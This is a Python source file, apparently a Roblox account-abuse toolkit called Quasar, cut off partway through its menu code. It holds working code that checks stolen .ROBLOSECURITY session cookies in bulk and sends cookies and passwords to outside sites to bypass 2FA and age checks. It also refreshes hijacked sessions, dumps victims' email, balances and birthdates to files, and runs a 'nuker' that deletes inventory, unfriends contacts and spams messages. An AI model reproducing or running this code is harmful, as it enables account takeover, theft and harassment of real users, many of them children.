# Quasar - Tool for roblox
# Creator - 0x256
# Website: quasar.gt.tc
# __   __         __  _  __ _____        _____ __  _  _  ____  _         __  __  ___   _______ _  _ _ __  _  __        _  
#| _\ /__\   __  |  \| |/__\_   _|  __  |_   _/__\| || |/ _/ || |  __   /  \|  \| \ `v' /_   _| || | |  \| |/ _]  __  / \ 
#| v | \/ | |__| | | ' | \/ || |   |__|   | || \/ | \/ | \_| >< | |__| | /\ | | ' |`. .'  | | | >< | | | ' | [/\ |__| \_/ 
#|__/ \__/       |_|\__|\__/ |_|          |_| \__/ \__/ \__/_||_|      |_||_|_|\__| !_!   |_| |_||_|_|_|\__|\__/      (_) 
#
# If you dont know python
#########################################################################################################################
# TODO: nothing:)
#########################################################################################################################
import ctypes
ctypes.windll.kernel32.SetConsoleTitleW("Loading core modules...")
import os
os.system('cls' if os.name == 'nt' else 'clear')
print("initialized")
import subprocess
print("subprocess loaded")
import os
print("os loaded")
import string
print("string loaded")
import sys
print("sys loaded")
import json
print("json loaded")

try:
    from pyisemail import is_email
    print("pyisemail loaded")
    from pystyle import Colorate, Colors, Add, Center, Write
    print("pystyle loaded")
    import requests
    print("requests loaded")
    import threading
    print("threading loaded")
    from queue import Queue
    print("queue loaded")
    import time
    print("time loaded")
    from webbrowser import open
    print("webbrowser loaded")
    from termcolor import cprint
    print("termcolor loaded")
    import random
    print("random loaded")
    import socket
    print("pysocket loaded")
    from tqdm import tqdm
    print("tqdm loaded")
    import glob
    print("glob loaded")
    from rich.console import Console
    print("rich.console loaded")
    import re
    print("re loaded")
except ImportError as e:
    print(f"\033[31m[ERROR] Missing package: {e}. Installing required packages...")
    
    try:
        import pip
    except ImportError:
        print("\033[31m[ERROR] Pip not installed. Installing now...")
        subprocess.call(
            "curl https://bootstrap.pypa.io/get-pip.py --output get-pip.py", shell=True
        )
        time.sleep(5)
        os.system("python get-pip.py")
    

    user_profile = os.environ['USERPROFILE'] if os.name == 'nt' else os.environ['HOME']
    

    packages = [
        "termcolor", "requests", "pystyle", "pyisemail", 
        "tqdm", "rich", "socket", "glob2"
    ]
    
    for package in packages:
        try:
            print(f"Installing {package}...")
            subprocess.call(f"pip install {package}", shell=True)
        except Exception as e:
            print(f"\033[31m[ERROR] Failed to install {package}: {e}")

finally:
    # Reattempt imports after installation
    try:
        from pyisemail import is_email
        print("pyisemail loaded")
        from pystyle import Colorate, Colors, Add, Center, Write
        print("pystyle loaded")
        import requests
        print("requests loaded")
        import threading
        print("threading loaded")
        from queue import Queue
        print("queue loaded")
        import time
        print("time loaded")
        from webbrowser import open
        print("webbrowser loaded")
        from termcolor import cprint
        print("termcolor loaded")
        import random
        print("random loaded")
        import socket
        print("pysocket loaded")
        from tqdm import tqdm
        print("tqdm loaded")
        import glob
        print("glob loaded")
        from rich.console import Console
        print("rich.console loaded")
        import re
        print("re loaded")
    except ImportError as e:
        print(f"\033[31m[CRITICAL ERROR] Failed to import after installation: {e}")
        sys.exit(1)

print("LOADED MODULES!")

## SETTINGS ##
year = time.localtime().tm_year
day = time.localtime().tm_mday
month = time.localtime().tm_mon
version = "2.2.0"
cookies_folder = "cookies"
user_profile = os.environ['USERPROFILE'] if os.name == 'nt' else os.environ['HOME']
github = "QuasarRBX"
repo = "Quasar"
## STARTING ##

def getBanner():
	bannerText = """
    
"""
	
	bannerLogo = """
                                                                       
          █████   █    ██  ▄▄▄        ██████  ▄▄▄       ██▀███  
        ▒██▓  ██▒ ██  ▓██▒▒████▄    ▒██    ▒ ▒████▄    ▓██ ▒ ██▒
        ▒██▒  ██░▓██  ▒██░▒██  ▀█▄  ░ ▓██▄   ▒██  ▀█▄  ▓██ ░▄█ ▒
        ░██  █▀ ░▓▓█  ░██░░██▄▄▄▄██   ▒   ██▒░██▄▄▄▄██ ▒██▀▀█▄  
        ░▒███▒█▄ ▒▒█████▓  ▓█   ▓██▒▒██████▒▒ ▓█   ▓██▒░██▓ ▒██▒
        ░░ ▒▒░ ▒ ░▒▓▒ ▒ ▒  ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░ ▒▒   ▓▒█░░ ▒▓ ░▒▓░
         ░ ▒░  ░ ░░▒░ ░ ░   ▒   ▒▒ ░░ ░▒  ░ ░  ▒   ▒▒ ░  ░▒ ░ ▒░
         ░   ░  ░░░ ░ ░   ░   ▒   ░  ░  ░    ░   ▒     ░░   ░ 
             ░       ░           ░  ░      ░        ░  ░   ░     
                                                                
                      Made With Love By 0x256                                                     
"""

	banner = Colorate.Vertical(Colors.purple_to_blue, Center.Center(Add.Add(bannerLogo, bannerText, 0)), 1)
	return banner

def check_version(version):
    Write.Print(f"Checking for updates...\n", Colors.purple, interval=0.0025)
    try:
        response = requests.get(f'https://raw.githubusercontent.com/{github}/{repo}/refs/heads/main/version')
        latest_version = response.text.strip()
        if latest_version != version:
            ctypes.windll.kernel32.SetConsoleTitleW("Checking for updates...")
            Write.Print(f"New version available. Please update to version {latest_version} from the Github! \n", Colors.red, interval=0.0025)
            Write.Input(f"Press any key if you want to continue \n", Colors.red, interval=0.0025)
        else:
            Write.Print(f"Newest version!\n", Colors.green, interval=0.0025)
            time.sleep(2)
            if os.name == "nt":
                os.system("cls")
            else:
                os.system("clear")
            print('')
            print(getBanner())
            GetNumber()

            

    except requests.exceptions.RequestException:
        pass
    except:
        pass

## START!!! ##

if os.name == "nt":
    os.system("cls")
else:
    os.system("clear")
print('')
print(getBanner())
ctypes.windll.kernel32.SetConsoleTitleW("initializing...")

#########################################################################################################################################
#########################################################################################################################################
#########################################################################################################################################
#########################################################################################################################################

## MAIN CODE ##

def masscheck():
    cookiefilefolder = os.path.dirname(__file__)
    cookiefile = (cookiefilefolder + "\cookies.txt")
    cookie = open(cookiefile).read().splitlines()
    
    validcount = 0
    invalidcount = 0
    i = 0
    if len(cookie) > 0:
        print(str(len(cookie)) + " Cookie(s) Found")
        print(" ")
        pathnameforvalid = os.path.join(os.path.dirname(__file__), "validcookies.txt")
        newfileforvalid = open(pathnameforvalid, "w")
        newfileforvalid.truncate(0)
        pathnameforinvalid = os.path.join(os.path.dirname(__file__), "invalidcookies.txt")
        newfileforinvalid = open(pathnameforinvalid, "w")
        newfileforinvalid.truncate(0)
        for line in cookie:
            check = requests.get('https://accountsettings.roproxy.com/v1/email', cookies={'.ROBLOSECURITY': str(line)})
            if check.status_code == 200:
                newfileforvalid.write("[VALID]: " + str(line) + "\n")
                validcount += 1
                i+=1
                Write.Print(f"[VALID]: {line}\n", Colors.purple_to_blue, interval=0.0025)
            else:
                newfileforinvalid.write("[INVALID]: " + str(line) + "\n")
                invalidcount += 1
                i+=1
                Write.Print(f"[INVALID]: {i}\n", Colors.red, interval=0.0025)
        print("Valid Cookie(s): " + str(validcount) + "\nInvalid Cookie(s):" + str(invalidcount))
    else:
        print("No cookies found.")
    Write.Input("Press any key to exit: ", Colors.purple, interval=0.0025)
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")
    print(getBanner())
    GetNumber()

#using website cuz im lazy
def bypass(cookie, type, password="12345678"):
    if type == "RemoveAll":
        url = "https://immortal.rs/api/misc/2faBypass.php"
        requests.Timeout = 999999999
        headers = {
            'Content-Type': 'application/json'
        }
        payload = {"Cookie":cookie,"Type":"AgeV2","Password":password}
        
        try:
            response = requests.post(
                url,
                headers=headers,
                data=json.dumps(payload)
            )
            
            data = response.json()
            return data["msg"]

            os.system("pause")
        except requests.exceptions.RequestException as e:
            return e
            os.system("pause")
    if type == "AllAges":
        url = "https://immortal.rs/api/misc/2faBypass.php"
        requests.Timeout = 999999999
        headers = {
            'Content-Type': 'application/json'
        }
        payload = {"Cookie":cookie,"Type":"Age","Password":password}
        
        try:
            response = requests.post(
                url,
                headers=headers,
                data=json.dumps(payload)
            )
            
            data = response.json()
            return data["msg"]
            return response.text
            os.system("pause")
        except requests.exceptions.RequestException as e:
            return e
            os.system("pause")

    if type == "Age":
        url = "https://rblxbypasser.com/api/bypass"
        requests.Timeout = 999999999
        headers = {
            'Content-Type': 'application/json'
        }
        payload = {
            "cookie": cookie
        }
        
        try:
            response = requests.post(
                url,
                headers=headers,
                data=json.dumps(payload)
            )
            
            data = response.json()
            return data["message"]
            #return response.text # old
            os.system("pause")
        except requests.exceptions.RequestException as e:
            return e
            os.system("pause")

    if type == "18+":
        url = "https://rbx-tool.com/apis/bypassAge"
        requests.Timeout = 999999999
        headers = {
            'Content-Type': 'application/json'
        }
        payload = {
            "cookie":cookie,
            "password":password,
            "directory":""
        }

        try:
            response = requests.post(
                url,
                headers=headers,
                data=json.dumps(payload)
            )
            
            return response.text
            os.system("pause")
        except requests.exceptions.RequestException as e:
            return e
            os.system("pause")

    if type == "Refresh":
        url = "https://www.rblxrefresh.net/refresh"
        requests.Timeout = 999999999
        headers = {
            'Content-Type': 'application/json'
        }
        payload = {
            "cookie":cookie
        }

        try:
            response = requests.post(
                url,
                headers=headers,
                data=json.dumps(payload)
            )

            return response.text
            os.system("pause")
        except requests.exceptions.RequestException as e:
            return e
            os.system("pause")


    os.system("pause")
    time.sleep(5)
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

    print(getBanner())
    GetNumber()
    
def cookie_refresh(cookie):
    try:
        requests.post("https://auth.roblox.com/v2/logout", headers={'Cookie': f'.ROBLOSECURITY={cookie}'})
        csrf = None
    except requests.exceptions.RequestException as e:
        csrf = e.response.headers.get("x-csrf-token") if e.response else None
    
    if not csrf:
        return "Error: No CSRF token"
    
    resp = requests.post("https://auth.roblox.com/v1/authentication-ticket", 
                       headers={'Cookie': f'.ROBLOSECURITY={cookie}',
                                'x-csrf-token': csrf,
                                'referer': 'https://www.roblox.com/',
                                'Content-Type': 'application/json'})
    
    ticket = resp.headers.get('rbx-authentication-ticket')
    if not ticket:
        return "Error: No auth ticket"
    
    resp2 = requests.post("https://auth.roblox.com/v1/authentication-ticket/redeem",
                         json={"authenticationTicket": ticket},
                         headers={'RBXAuthenticationNegotiation': '1'})
    
    if resp2.status_code == 200:
        set_cookie = resp2.headers.get('set-cookie', '')
        match = re.search(r'(_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.\|_[A-Za-z0-9=\-\._]+)', set_cookie)
        return "Refreshed cookie: "+match.group(0) if match else None
    
    return "Unknown error"



def BuyAll():
    cookie = Write.Input(f"Cookie to free-item-buyer: ", Colors.purple_to_blue, interval=0.0025)
    try:
        session = requests.Session()
        session.cookies.update({".ROBLOSECURITY": cookie})

        console = Console(highlight=False)


        def cprint(color: str, content: str) -> None:
            console.print(f"[ [bold {color}]>[/] ] {content}")


        def fetch_items() -> None:
            result = {}
            cursor = ""

            while cursor is not None:
                req = session.get(
                    f"https://catalog.roblox.com/v1/search/items/details?category=All&creatorTargetId=1&limit=30&maxPrice=0&cursor={cursor}"
                )
                res = req.json()

                if req.status_code == 429:
                    cprint("red", "Rate limited. Waiting 20 seconds")
                    time.sleep(20)
                    continue

                for item in res.get("data", []):
                    item_name = item.get("name")
                    result[item_name] = item.get("productId")
                    cprint("blue", f"Found {item_name}")

                cursor = res.get("nextPageCursor")

            return result


        def purchase(name: str, product_id: int) -> None:
            req = session.post("https://auth.roproxy.com/v2/login")
            csrf_token = req.headers["x-csrf-token"]

            while True:
                req = session.post(
                    f"https://economy.roproxy.com/v1/purchases/products/{product_id}",
                    json={"expectedCurrency": 1, "expectedPrice": 0, "expectedSellerId": 1},
                    headers={"X-CSRF-TOKEN": csrf_token},
                )

                if req.status_code == 429:
                    cprint("red", "Rate limited. Waiting 60 seconds")
                    time.sleep(60)
                    continue

                res = req.json()
                if "reason" in res and res.get("reason") == "AlreadyOwned":
                    cprint("yellow", f"{name} is already owned")
                    return

                cprint("green", f"Successfully purchased {name}")
                return


        def main() -> None:
            free_items = fetch_items()
            for name, product_id in free_items.items():
                purchase(name, product_id)


        main()
    except Exception as e:
        Write.Print(e, Colors.red, interval=0.0025)
        Write.Input("Press any key", Colors.purple_to_blue, interval=0.0025)




def Pin_Cracker():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")
    
    print(getBanner())
    print('Hello there! Roblox officialy closed pin system in accounts. Now you can bypass age and email!')
    print('')

    Write.Input("Press any key", Colors.purple_to_blue, interval=0.0025)


    

def Nucker():
    def getXsrf(cookie):
        xsrfRequest = requests.post(
            "https://auth.roproxy.com/v2/logout", cookies={".ROBLOSECURITY": cookie}
        )
        return xsrfRequest.headers["x-csrf-token"]


    def clear():
        if os.name == "nt":
            os.system("cls")
        else:
            os.system("clear")


    class Nuke:
        def __init__(self):
            self.headers = None
            self.cookie = None
            self.start()

        def flash(self):
            print("[", end="")
            cprint(" NUKER ", "magenta", end="")
            print("] ", end="")
            cprint("Flashing....", "magenta")
            print("[", end="")
            cprint(" NUKER ", "yellow", end="")
            print("] ", end="")
            cprint("Press Ctrl + C to stop", "yellow")
            try:
                while True:
                    requests.patch(
                        "https://accountsettings.roproxy.com/v1/themes/user",
                        cookies={".ROBLOSECURITY": str(self.cookie)},
                        headers=self.headers,
                        data={"themeType": "Light"},
                    )
                    requests.patch(
                        "https://accountsettings.roproxy.com/v1/themes/user",
                        cookies={".ROBLOSECURITY": str(self.cookie)},
                        headers=self.headers,
                        data={"themeType": "Dark"},
                    )
            except KeyboardInterrupt:
                print("[", end="")
                cprint(" NUKER ", "magenta", end="")
                print("] ", end="")
                for i in "Done Nuking...":
                    time.sleep(0.1)
                    cprint(i, "magenta", end="", flush=True)

        def changeLanguage(self):
            while True:
                requests.post(
                    "https://locale.roproxy.com/v1/locales/set-user-supported-locale",
                    cookies={".ROBLOSECURITY": str(self.cookie)},
                    headers=self.headers,
                    data={"supportedLocaleCode": "ja_jp"},
                )
                requests.post(
                    "https://locale.roproxy.com/v1/locales/set-user-supported-locale",
                    cookies={".ROBLOSECURITY": str(self.cookie)},
                    headers=self.headers,
                    data={"supportedLocaleCode": "ko_kr"},
                )

        def messageAll(self, message):
            print("[", end="")
            cprint(" NUKER ", "magenta", end="")
            print("] ", end="")
            cprint("Messaging friends....", "magenta")
            conversations = requests.get(
                "https://chat.roproxy.com/v2/get-user-conversations?pageNumber=1&pageSize=3000",
                cookies={".ROBLOSECURITY": str(self.cookie)},
                headers=self.headers,
            ).json()
            for conversation in conversations:
                requests.post(
                    "https://chat.roproxy.com/v2/send-message",
                    data={"conversationId": conversation["id"], "message": message},
                    cookies={".ROBLOSECURITY": str(self.cookie)},
                    headers=self.headers,
                )
                print("[", end="")
                cprint(" NUKER ", "magenta", end="")
                print("] ", end="")
                cprint(f"Sent message to {conversation['id']}", "magenta")

        def removeItems(self):
            items = requests.get(
                f"https://www.roproxy.com/users/inventory/list-json?assetTypeId=2&cursor=&itemsPerPage=1000000000&pageNumber=1&userId={self.userid}",
                cookies={".ROBLOSECURITY": str(self.cookie)},
                headers=self.headers,
            ).json()["Data"]["Items"]
            for item in items:
                time.sleep(4)
                id = item["Item"]["AssetId"]
                response = requests.post(
                    "https://www.roproxy.com/asset/delete-from-inventory",
                    data={"assetId": str(id)},
                    cookies={".ROBLOSECURITY": str(self.cookie)},
                    headers=self.headers,
                )
                if response.status_code == 429:
                    time.sleep(10)
                    response = requests.post(
                        "https://www.roproxy.com/asset/delete-from-inventory",
                        data={"assetId": id},
                        cookies={".ROBLOSECURITY": str(self.cookie)},
                        headers=self.headers,
                    )
                    print("[", end="")
                    cprint(" NUKER ", "magenta", end="")
                    print("] ", end="")
                    cprint(f"Removed {id} from user's inventory", "magenta")
                else:
                    print("[", end="")
                    cprint(" NUKER ", "magenta", end="")
                    print("] ", end="")
                    cprint(f"Removed {id} from user's inventory", "magenta")
            print("[", end="")
            cprint(" NUKER ", "magenta", end="")
            print("] ", end="")
            cprint("Removed all items from user's inventory", "magenta")
            time.sleep(1)

        def unfriend(self):
            print("[", end="")
            cprint(" NUKER ", "magenta", end="")
            print("] ", end="")
            cprint("Unfriending friends....", "magenta")
            friends = requests.get(
                f"https://friends.roproxy.com/v1/users/{self.userid}/friends",
                cookies={".ROBLOSECURITY": str(self.cookie)},
            ).json()["data"]
            friendIds = [friend["id"] for friend in friends]
            for i in friendIds:
                time.sleep(0.1)
                print(
                    requests.post(
                        f"https://friends.roproxy.com/v1/users/{i}/unfriend",
                        cookies={".ROBLOSECURITY": str(self.cookie)},
                        headers=self.headers,
                    ).text
                )
                print("[", end="")
                cprint(" NUKER ", "magenta", end="")
                print("] ", end="")
                cprint(f"Unfriended {i}!", "magenta")
            print("[", end="")
            cprint(" NUKER ", "magenta", end="")
            print("] ", end="")
            cprint("Unfriended All!", "magenta")

        def check(self):
            print("[", end="")
            cprint("NUKER", "magenta", end="")
            print("] ", end="")
            cprint("Enter Your Cookie Below:", "magenta")
            self.cookie = input("> ")
            print("[", end="")
            cprint(" NUKER ", "magenta", end="")
            print("] ", end="")
            cprint("Enter Your mass dm message below:", "magenta")
            self.message = input("> ")
            return requests.get(
                "https://chat.roproxy.com/v2/get-unread-conversation-count",
                cookies={".ROBLOSECURITY": str(self.cookie)},
            )

        def start(self):
            os.system("")
            check = self.check()
            if check.status_code == 200:
                self.headers = {"X-CSRF-TOKEN": getXsrf(self.cookie)}
                userdata = requests.get(
                    "https://users.roproxy.com/v1/users/authenticated",
                    cookies={".ROBLOSECURITY": self.cookie},
                ).json()  # get user data
                self.userid = userdata["id"]  # user id
                clear()
                threading.Thread(target=self.flash).start()
                threading.Thread(target=self.unfriend).start()
                threading.Thread(target=self.changeLanguage).start()
                threading.Thread(target=self.removeItems).start()
                threading.Thread(target=self.messageAll, args=(self.message,)).start()
                Write.Input("Press any key to exit", Colors.purple, interval=0.0025)
                os.system("cls")
                print('')
                print(getBanner())
                GetNumber()
            else:
                print(check.status_code)
                print("[", end="")
                cprint(" ERROR ", "red", end="")
                print("] ", end="")
                cprint("Invalid Cookie", "red")
                time.sleep(1.4)
                clear()
                print(getBanner())
                self.check()
    try:
        Nuke()
    except Exception as e:
        Write.Print(e, Colors.red, interval=0.0025)
        Write.Input("Press any key", Colors.purple_to_blue, interval=0.0025)



def GruupFind():
    try:

        def groupfinder(suma):
            try:
                id = random.randint(1000000, 1150000)
                r = requests.get(f"https://www.roproxy.com/groups/group.aspx?gid={id}", timeout=30)
                if 'owned' not in r.text:
                    re = requests.get(f"https://groups.roproxy.com/v1/groups/{id}", timeout=30)
                    if re.status_code != 429:
                        if 'errors' not in re.json():
                            if 'isLocked' not in re.text and 'owner' in re.text:
                                if re.json()['publicEntryAllowed'] == True and re.json()['owner'] == None:
                                    Write.Print(f"[+] Hit: {id}\n", Colors.green_to_cyan, interval=0.0025)
                                    suma+=1
                                else:
                                    Write.Print(f"[-] No Entry: {id}\n", Colors.green_to_cyan, interval=0.0025)
                            else:
                                Write.Print(f"[-] Group Locked: {id}\n", Colors.green_to_cyan, interval=0.0025)
                    else:
                        Write.Print(f"[-] Group API Rate Limited\n", Colors.green_to_cyan, interval=0.0025)
                else:
                    Write.Print(f"[-] Group Already Owned: {id}\n", Colors.green_to_cyan, interval=0.0025)
            except:
                pass
                return suma

        inputa =  Write.Input("[-] How many repeats: ", Colors.purple_to_blue, interval=0.0025)
        threads = int(inputa)
        suma = 0
        while threads!=0:
            groupfinder(suma)
            threads = threads-1

        Write.Input(f"Sum of the resulting groups: {suma}. Press any key to exit", Colors.purple, interval=0.0025)
        
    except Exception as e:
        Write.Print(e, Colors.red, interval=0.0025)
        Write.Input("Press any key", Colors.purple_to_blue, interval=0.0025)

def download_file(url, filepath):
    try:
        response = requests.get(url, stream=True)
        response.raise_for_status()
        total_size = int(response.headers.get('content-length', 0))
        with open(filepath, 'wb') as file, tqdm(
            total=total_size, unit='B', unit_scale=True, desc=f"Downloading {os.path.basename(filepath)}"
        ) as progress_bar:
            for chunk in response.iter_content(chunk_size=8192):
                file.write(chunk)
                progress_bar.update(len(chunk))
    except Exception as e:
        print(f"Error {os.path.basename(filepath)}: {e}")
        Write.Input("Press any key", Colors.purple_to_blue, interval=0.0025)



def check(cookie):
  check = requests.get('https://accountsettings.roproxy.com/v1/email', cookies={'.ROBLOSECURITY': cookie})
  if check.status_code == 200:
    Emmail = requests.get('https://accountsettings.roproxy.com/v1/email', cookies={'.ROBLOSECURITY': str(cookie)}).json()
    email = Emmail['verified']
    EmailName = Emmail['emailAddress']
    Write.Print(f"[Process] Get email...\n", Colors.purple, interval=0.0025)
    credit = requests.get("https://billing.roproxy.com/v1/credit", cookies={'.ROBLOSECURITY': str(cookie)}).json()['balance']
    Write.Print(f"[Process] Get credit...\n", Colors.purple, interval=0.0025)
    userdata = requests.get("https://users.roproxy.com/v1/users/authenticated",cookies={".ROBLOSECURITY":cookie}).json() #get user data
    birthday = requests.get("https://accountinformation.roproxy.com/v1/birthdate", cookies={'.ROBLOSECURITY': str(cookie)}).json()
    Write.Print(f"[Process] Get birthday...\n", Colors.purple, interval=0.0025)
    userid = userdata['id'] #user id
    followers = requests.get(f"https://friends.roproxy.com/v1/users/{userid}/followers/count", cookies={'.ROBLOSECURITY': str(cookie)}).json()['count']
    Write.Print(f"[Process] Get followers...\n", Colors.purple, interval=0.0025)
    Write.Print(f"[Process] Get userId...\n", Colors.purple, interval=0.0025)

    transactions = requests.get(f"https://economy.roproxy.com/v2/users/{userid}/transaction-totals?timeFrame=Month&transactionType=summary", cookies={'.ROBLOSECURITY': str(cookie)}, data={'timeFrame':'Month', 'transactionType': 'summary'}).json()
    pending = transactions['pendingRobuxTotal']
    Write.Print(f"[Process] Get Pending...\n", Colors.purple, interval=0.0025)
    stipends = transactions['premiumStipendsTotal']
    Write.Print(f"[Process] Get stipends...\n", Colors.purple, interval=0.0025)
    devEx = transactions['developerExchangeTotal']
    Write.Print(f"[Process] Get DevEX...\n", Colors.purple, interval=0.0025)
    groups = requests.get(f"https://groups.roproxy.com/v1/users/{userid}/groups/roles", cookies={'.ROBLOSECURITY': str(cookie)})
    groupIds = [i['group']['id'] for i in groups.json()['data'] if i['group']['owner']['userId'] == userid]
    groupFunds = 0
    for i in groupIds:
        groupFunds += int(requests.get(f"https://economy.roproxy.com/v1/groups/{i}/currency", cookies={'.ROBLOSECURITY': str(cookie)}).json()['robux'])
    creationDate = requests.get(f'https://users.roproxy.com/v1/users/{userid}').json()['created']
    display = userdata['displayName'] #display name
    Write.Print(f"[Process] Get Display...\n", Colors.purple, interval=0.0025)
    username = userdata['name'] #username
    Write.Print(f"[Process] Get Username...\n", Colors.purple, interval=0.0025)
    robuxdata = requests.get(f'https://economy.roproxy.com/v1/users/{userid}/currency',cookies={".ROBLOSECURITY":cookie}).json() 
    robux = robuxdata['robux'] 
    Write.Print(f"[Process] Get Robux...\n", Colors.purple, interval=0.0025)
    premiumbool = requests.get(f'https://premiumfeatures.roproxy.com/v1/users/{userid}/validate-membership', cookies={".ROBLOSECURITY":cookie}).json()
    rap_dict = requests.get(f'https://inventory.roproxy.com/v1/users/{userid}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100',cookies={".ROBLOSECURITY":cookie}).json()
    while rap_dict['nextPageCursor'] != None:
        rap_dict = requests.get(f'https://inventory.roproxy.com/v1/users/{userid}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100',cookies={".ROBLOSECURITY":cookie}).json()
    rap = sum(i['recentAveragePrice'] for i in rap_dict['data'])
    birthdate = f'{birthday["birthMonth"]}/{birthday["birthDay"]}/{birthday["birthYear"]}'
    thumbnail=requests.get(f"https://thumbnails.roproxy.com/v1/users/avatar?userIds={userid}&size=420x420&format=Png&isCircular=false").json()
    image_url = thumbnail["data"][0]["imageUrl"]
    pindata = requests.get('https://auth.roproxy.com/v1/account/pin',cookies={".ROBLOSECURITY":cookie}).json() 
    pin_bool = pindata["isEnabled"] 

    print(getBanner())
    Write.Print(f"Username: {username}, url= https://roproxy.com/users/{userid}\n", Colors.purple_to_blue, interval=0.0025)
    file = f"{username}_cookie.txt"
    with open(file, 'a+') as f:
            f.write(f"Username: {username} | ")
            Write.Print(f"Display name: {display}\n", Colors.purple_to_blue, interval=0.0025)
            Write.Print(f"User ID: {userid}\n", Colors.purple_to_blue, interval=0.0025)
    with open(file, 'a+') as f:
            f.write(f"UserID: {userid} | ")
            Write.Print(f"Robux: {robux}\n", Colors.purple_to_blue, interval=0.0025)
    with open(file, 'a+') as f:
            f.write(f"Robux: {robux} | ")
            Write.Print(f"Has pin: {pin_bool}\n", Colors.purple_to_blue, interval=0.0025)
    with open(file, 'a+') as f:
            f.write(f"Has pin: {pin_bool} | ")
            if pin_bool == True:
                Write.Print(f"[advice]: Use Quasar pin cracker!\n", Colors.purple, interval=0.0025)
            Write.Print(f"Premium: {premiumbool}\n", Colors.purple_to_blue, interval=0.0025)
    with open(file, 'a+') as f:
            f.write(f"Premium: {premiumbool} | ")
            Write.Print(f"Credit: {credit}\n", Colors.purple_to_blue, interval=0.0025)
    with open(file, 'a+') as f:
            f.write(f"Credit: {credit} | ")
            Write.Print(f"Birthday: {birthdate}\n", Colors.purple_to_blue, interval=0.0025)
    with open(file, 'a+') as f:
            f.write(f"birthday: {birthdate} | ")
            Write.Print(f"Groups: {groupIds}\n", Colors.purple_to_blue, interval=0.0025)
    with open(file, 'a+') as f:
            f.write(f"Groups: {groupIds} | ")
            Write.Print(f"Rap: {rap}\n", Colors.purple_to_blue, interval=0.0025)
    with open(file, 'a+') as f:
            f.write(f"Rap: {rap} | ")
            Write.Print(f"Is email verified: {email}\n", Colors.purple_to_blue, interval=0.0025)
    with open(file, 'a+') as f:
            f.write(f"Email verified: {email} | ")
            Write.Print(f"Email: {EmailName}\n", Colors.purple_to_blue, interval=0.0025)
    with open(file, 'a+') as f:
            f.write(f"Email name: {EmailName} | ")
            Write.Print(f"group founds: {groupFunds}\n", Colors.purple_to_blue, interval=0.0025)
    with open(file, 'a+') as f:
            f.write(f"Group founds: {groupFunds} | ")
            Write.Print(f"Dev exchange: {devEx}\n", Colors.purple_to_blue, interval=0.0025)
    with open(file, 'a+') as f:
            f.write(f"DEVx exchange: {devEx} | ")
    with open(file, 'a+') as f:
            f.write(f"followers: {followers} | ")
            Write.Print(f"Pending: {pending}\n", Colors.purple_to_blue, interval=0.0025)
    with open(file, 'a+') as f:
            f.write(f"Pending: {pending} | ")
            Write.Print(f"Premium Stipends: {stipends}\n", Colors.purple_to_blue, interval=0.0025)
    with open(file, 'a+') as f:
            f.write(f"Premium Stipends: {stipends} | ")
            Write.Print(f"Followers: {followers}\n", Colors.purple_to_blue, interval=0.0025)
    with open(file, 'a+') as f:
            f.write(f"Display name: {display} | ")
    with open(file, 'a+') as f:
            f.write(f"Cookie: {cookie} | ")
    with open(file, 'a+') as f:
            f.write(f"Quasar cookie checker by JealLeal. Saved on: {day}.{month}.{year}")
        #dualhook
    os.system("pause")
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")
    print('')
    print(getBanner())
    GetNumber()
  else:
        Write.Print(f"Followers: {followers}\n", Colors.purple_to_blue, interval=0.0025)

def GetNumber():
    ctypes.windll.kernel32.SetConsoleTitleW("Welcome to Quasar!")
    Printing = Colorate.Vertical(Colors.purple_to_blue, Center.XCenter("""
    [1] Cheats (Quasar)    [ONLINE];                [6] Email validator  [OFFLINE];               [11] Bypass 18+              [ONLINE];                 
    [2] Cookie checker     [ONLINE];                [7] Nucker           [ONLINE];                [12] Bypass age              [ONLINE];                 
    [3] Immortal           [ONLINE];                [8] BruteForcer      [OFFLINE];               [13] Bypass all              [ONLINE];            
    [4] Roblox Pin cracker [OFFLINE];               [9] free-item-buyer  [ONLINE];                [14] Cookie refresh          [ONLINE];                  
    [5] Group finder       [ONLINE];                [10] C# QMCC         [ONLINE];                [15] Bypass 18-              [ONLINE];  """), 1)  
    print(Printing)
    Number = int(Write.Input("Enter number: ", Colors.purple_to_blue, interval=0.0025))
    
    if Number == 1:
        ctypes.windll.kernel32.SetConsoleTitleW("Injector")
        Write.Print("Starting... \n", Colors.purple_to_blue, interval=0.0025)
        time.sleep(2)
        if os.name == "nt":
            os.system("cls")
        else:
            os.system("clear")
        print('')
        print(getBanner())
        link = f"https://github.com/{github}/QuasarInjector/releases/download/2.1.4/Injector.zip"
        
        current_dir = os.path.dirname(sys.executable if getattr(sys, 'frozen', False) else __file__)
        download_file(link, os.path.join(current_dir, "Injector.zip"))
        Printing = Colorate.Vertical(Colors.red_to_yellow, Center.XCenter(f"Downloaded successfully in {current_dir}\Injector.zip. \n Unpack it and start having fun:)\n\n"), 1)  
        print(Printing)
        os.system("pause")
        if os.name == "nt":
            os.system("cls")
        else:
            os.system("clear")
        print('')
        print(getBanner())
        GetNumber()
    elif Number == 2:
        ctypes.windll.kernel32.SetConsoleTitleW("Cookie Checker")
        Write.Print("Starting... \n", Colors.purple_to_blue, interval=0.0025)
         
        time.sleep(2)
        if os.name == "nt":
            os.system("cls")
        else:
            os.system("clear")
        print('')
        print(getBanner())

        cookie = Write.Input(f"Cookie to check: ", Colors.purple_to_blue, interval=0.0025)
        check(cookie)
        
    elif Number == 3:
        
        Write.Print("Starting... \n", Colors.purple_to_blue, interval=0.0025)
        time.sleep(2)
        if os.name == "nt":
            os.system("cls")
        else:
            os.system("clear")
        print('')
        print(getBanner())
        if os.name == "nt":
            os.system("cls")
        else:
            os.system("clear")
        open("https://immortal.rs/dashboard/")
        time.sleep(2)
        if os.name == "nt":
            os.system("cls")
        else:
            os.system("clear")
        print('')
        print(getBanner())
        GetNumber()

    elif Number == 5:
        ctypes.windll.kernel32.SetConsoleTitleW("Group finder")
        Write.Print("Starting... \n", Colors.purple_to_blue, interval=0.0025)
        time.sleep(2)
        GruupFind()
        if os.name == "nt":
            os.system("cls")
        else:
            os.system("clear")
        print('')
        print(getBanner())
        GetNumber()
    elif Number == 7:
